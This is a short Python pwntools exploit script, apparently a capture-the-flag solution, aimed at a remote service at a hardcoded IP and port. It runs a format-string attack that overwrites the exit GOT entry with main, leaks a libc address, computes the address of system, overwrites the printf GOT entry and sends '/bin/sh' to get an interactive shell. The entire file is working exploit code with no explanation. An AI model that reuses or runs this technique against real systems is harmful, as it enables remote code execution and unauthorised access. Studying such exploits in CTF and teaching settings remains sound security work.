from pwn import *

exit_got = 0x0000000000404030
printf_got = 0x0000000000404018
main = 0x401152
# tekbteb main fi got exit
while True:
    try:
        payload = ""
        payload += p64(exit_got)
        payload += "A"*(16-len(payload))
        payload += "%" + str(main & 0xffff) + "x"
        payload += "%8$hn"
        payload += p64(exit_got)
        #p = process("./pwn1")
        p = remote("40.124.3.68",11337)
        #p = process("./pwn1")
        p.sendline(payload)
        __libc_start_main = 0x0000000000403ff0
        payload = ""
        payload += p64(__libc_start_main)
        payload += "A"*(16-len(payload))
        payload += "%8$s"
        payload += p64(exit_got)
        #pause()
        p.sendline(payload)
        p.recvuntil("Welcome ")
        data = p.recv()
        print data
        data = data.split("0@@")[0]
        leak = u64(data.ljust(8,"\x00"))
        print "leak: ",hex(leak)
        base = leak - 0x021e50
        system = base + 0x046590
        print "system: ",hex(system)
        print "base: ",hex(base)
        to_write = system & 0xffffffff
        print hex(to_write)
        if len(hex(to_write)) < 9:
            print "Fouuuuuuuuuuuuuuuuuund" 
            pause()
            payload = ""
            payload += p64(printf_got)
            payload += "A"*(16-len(payload))
            payload += "%" + str(to_write) + "x"
            payload += "%8$n"
            payload += p64(exit_got)
            p.sendline(payload)
            payload = ""
            payload += "A"*16
            payload += "/bin/sh\x00"
            p.sendline(payload)
            print "system: ",hex(system)
            print "base: ",hex(base)
            print hex(to_write)
            p.interactive()
        else:
            p.close()
            continue
    except:
        continue
